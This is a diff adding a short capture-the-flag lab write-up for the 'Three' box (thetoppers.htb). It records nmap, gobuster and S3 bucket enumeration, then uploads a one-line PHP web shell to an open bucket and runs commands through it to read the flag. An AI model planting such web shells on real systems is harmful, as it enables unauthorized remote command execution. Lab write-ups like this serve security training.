@@ -1,0 +1,41 @@
+Three Lab Report:
+
+
+Nmap Scan Report:
+
+  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+  
+  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+
+
+Web Enumeration:
+    
+  Subdomain found using Gobuster
+    -s3.thetoppers.htb
+  
+  aws s3 bucket enumeration using awscli
+    >aws s3 ls --endpoint-url=http://s3.thetoppers.htb s3://thetoppers.htb
+                               PRE images/
+    2026-06-18 17:51:54          0 .htaccess
+    2026-06-18 17:51:54      11952 index.php
+
+ 
+Exploitation:
+
+  PHP shell command injection script
+    <?php system($_GET['cmd']); ?> | shell.php
+  
+  Injected to the s3 bucket using awscli
+    > aws s3 cp --endpoint-url=http://s3.thetoppers.htb shell.php s3://thetoppers.htb
+    upload: ./shell.php to s3://thetoppers.htb/shell.php 
+
+  Shell code injected Successfully
+    >aws s3 ls --endpoint-url=http://s3.thetoppers.htb s3://thetoppers.htb
+                               PRE images/
+    2026-06-18 17:51:54          0 .htaccess
+    2026-06-18 17:51:54      11952 index.php
+    2026-06-18 20:46:53         31 shell.php
+
+  Shell Commands can be injected using /shell.php?cmd=ls parameter
+  
+  Flag captured at  http://thetoppers.htb/shell.php?cmd=cat+../flag.txt
